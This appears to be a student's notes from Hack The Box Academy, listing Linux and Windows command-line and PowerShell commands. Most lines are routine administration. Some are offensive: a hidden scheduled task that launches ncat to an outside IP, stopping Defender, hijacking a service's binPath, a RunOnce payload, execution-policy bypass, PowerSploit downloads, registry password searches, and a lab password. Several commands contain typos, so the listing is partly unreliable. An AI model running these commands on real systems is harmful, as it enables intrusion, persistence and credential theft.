# Linux

```bash
smbclient -L SERVER_IP -U htb-student
smbclient '\\SERVER_IP\Company Data' -U htb-student
sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/"Company Data" /home/user/Desktop/
sudo apt-get install cifs-utils


```

# Windows TODO: Priv Escalation, Attack and Defense, Event Logs and Finding Evil, Intro to AD, File Transfers Windows File Transfer Methods, Detecting Windows Attacks w/ Splunk, AD enum + attacks

## CMD Line, Fundamentals

### CMD

```bat
ssh htb-student@<IP-Address>

doskey /history
cls
ping 8.8.8.8

ipconfig /?
ipconfig /all
arp /a

cd
cd C:\User\htb\Pictures
cd ..\..\..\..\
cd .\Pictures

icacls c:\windows
icacls c:\Users
icacls c:\users /grant joe:f


whoami
whoami /groups
whoami /priv
net user
net group
net localgroup
net share
new view
systeminfo
hostname
ver

sc qc quauserv
sc query type= service
sc stop windefend
sc query Spooler
sc stop Spooler
sc start Spooler
sc query wuaserv
sc query bits
sc config wuaserv start=disabled
sc config wuauserv binPath=C:\Winbows\Perfectlylegitprogram.exe
sc sdshow wuauserv

tasklist /svc
net start
wmic service list brief
wmic os list brief

SCHTASKS /Query /V /FO list
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
schtasks /query /tn "My Secret Task" /V /fo list
schtasks /delete  /tn "My Secret Task" 


where calc.exe
where /R C:\ bio.txt
where /R C:\Users/student\ bio.txt
where /R C:\Users\student\ *.csv

tree 
tree /F
tree c:\ /f | more

dir /A:R
dir /A:H

%SUPER_IMPORTANT_VARIABLE%
echo %WINDIR%
set SECRET=HTB{5UP3r_53Cr37_V4r14813}
set %SECRET%
set DCIP=172.16.5.2
setx DCIP 172.16.5.2
echo %DCIP%
setx DCIP ""

md new-directory
mkdir yet-another-dir

rd /S GitPulls

move example C:\User\htb\Documents\example

copy calc.exe C:\Users\student\Downloads\copied-calc.exe /V

xcopy C:\Users\htb\Desktop C:\Users\htb\Documents

robocopy C:\Users\htb\Desktop C:\Users\htb\Documents

robocopy \E \B \L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\

more \S secrets.txt
type bio.txt
echo More text for our demo file >> demo.txt

 comp .\file-1.md .\file-2.md
 fc.exe passwords.txt modded.txt /N
 sort.exe .\file-1.md /O .\sort-1.md
 sort.exe .\sort-1.md /unique

fsutil file createNew for-sure.txt 222
ren demo.txt superdemo.txt

find "password" "C:\Users\student\not-passwords.txt"
find /N /I /V "IP Address" example.txt
find /i "see" < text.txt
ipconfig /all | find /i "IPV4"
ping 8.8.8.8 & type test.txt

cd C:\Users\student\Documents\Backup && echo 'did this work' > yes.txt

del file-1
erase file-3 file-3
del /A:R

xfreerdp /v:<targetIp> /u:htb-student /p:Password
```

### PS

```powershell

uname -a
whoami /user
gci -Hidden

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber



Get-Help Test-Wsman
Update-Help
Get-Location
Get-ChildItem
Set-Location .\Documents\
Set-Location C:\Users\HTB\Documents
Get-Content Readme.md
Get-Command
Get-Command -verb get
Get-Command -noun windows*
Get-History

Get-Alias
Set-Alias -Name gh -Value Get-Help
New-Alias -Name "Show-Files" Get-ChildItem
Get-Alias -Name "Show-Files"

.\PowerView.ps1;Get-LocalGroup |fl


Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
Get-Module
Get-Module -ListAvailable
Get-Help Import-Module
Import-Module .\PowerSploit.psd1
Get-NetLocalgroup
$env:PSModulePath
Get-ExecutionPolicy
Set-ExecutionPolicy undefined
Set-ExecutionPolicy -scope Process
Set-ExecutionPolicy Bypass -Scope Process
Get-ExecutionPolicy -list
Get-Command -Module Powersploit
Get-Command -Module PowerShellGet
Find-Module -Name AdminToolbox
get-localgroup
Get-LocalUser
New-LocalUser -Name "LB" -NoPassword
$PASSWORD = Read-Host -AsSecuringSTring
Set-LocalUser -Name "LB" -Password $Password -Description "Big Dumb Head"
Get-LocalGroup
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "LB"
Get-LocalGroupMember -Name "Remote Desktop Users"
Get-WindowsCapability -Name RSAT* Online | Add-WindowsCapability -Online
Get-Module -Name ActiveDirectory -ListAvailable
Get-ADUser -Filter *
Get-ADUser -Identity TSilver
Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
> New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true
Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum" 
Get-ADUser -Identity MTanaka -Property Description
new-item -name "SOPs" -type directory
cd SOPs
new-Item "Readme.md" -ItemType File
Add-Content .\Readme.md "Title: Insert Document Title Here"
Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md
get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}

Get-Help *-Service
Get-Service | ft DisplayName,Status
Get-Service | measure
Get-Service | where DisplayName -like '*Defender*' | ft DisplayName, ServiceName, Status
Start-Service WinDefend
get-service WinDefend
Stop-Service Spooler
Start-Service Spooler
Get-Service Spooler | Select-Object -Property Name, StartType, Status, DisplayName
Set-Service -Name Spooler -StartType Disabled
Get-Service -Name Spooler | Slect-Object -Property StartType
get-service -ComputerName ACADEMY-ICL-DC
Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
 Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
\\live.sysinternals.com\tools\procdump.exe -accepteula
Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List


Invoke-Command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}

Get-ChildItem C:\Windows\System32\config\
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
REQ QUERY HKCU /F "Password" /t REG_SZ /S /K
New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"
Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"
Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey
ls C:\Windows\System32\winevt\logs
wevtutil el
wevtutil gl "Windows Powershell"
wevtutil gli "Windows Powershell"
wevtutil qe Security /c:5 /rd:true /f:text
wevtutil epl System C:\system_export.evtx
Get-WinEvent -ListLog *
Get-WinEvent -ListLog Security
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message

ipconfig /all
arp -a
nslookup ACADEMY-ICL-DC
netstat -an
get-netIPInterface
get-NetIPAddress -ifIndex 25
Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled
Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24
Get-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength
Get-NetIPinterface -ifindex 20 | ft ifIndex,InterfaceAlias,Dhcp
Restart-NetAdapter -Nme 'Ethernet 3'
Test-NetConnection
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Start-Service sshd
Set-Service -Name ssh -StartupType 'Automatic'
ssh htb-student@10.129.224.248
powershell
winrm quickconfig
Test-WSMan -ComputerName "10.129.224.248"
Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate
Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
$PSVersionTable

Get-Help Invoke-Webrequest
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method Get | Get-Member
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
 python3 -m http.server 8000
 Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -Outfile "C:\Powerview.ps1"
 (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

 mkdir quick-recon
 New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru
ni quick-recon.psm1 -ItemType File
Import-Module ActiveDirectory

function Get-Recon {  
    # Collect the hostname of our PC.
    $Hostname = $env:ComputerName  
    # Collect the IP configuration.
    $IP = ipconfig
    # Collect basic domain information.
    $Domain = Get-ADDomain 
    # Output the users who have logged in and built out a basic directory structure in "C:\Users\".
    $Users = Get-ChildItem C:\Users\
    # Create a new file to place our recon results in.
    new-Item ~\Desktop\recon.txt -ItemType File 
    # A variable to hold the results of our other variables. 
    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
    # It does the thing 
    Add-Content ~\Desktop\recon.txt $Vars
  }
Export-ModuleMember
Export-ModuleMember -Function Get-Recon -Variable Hostname
Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1'
get-module

Invoke-WmiMethod -Path "CIM_DataFile.Name='C:\users\public\spns.csv'" -Name Rename -ArgumentList "C:\Users\Public\kerberoasted_users.csv"

```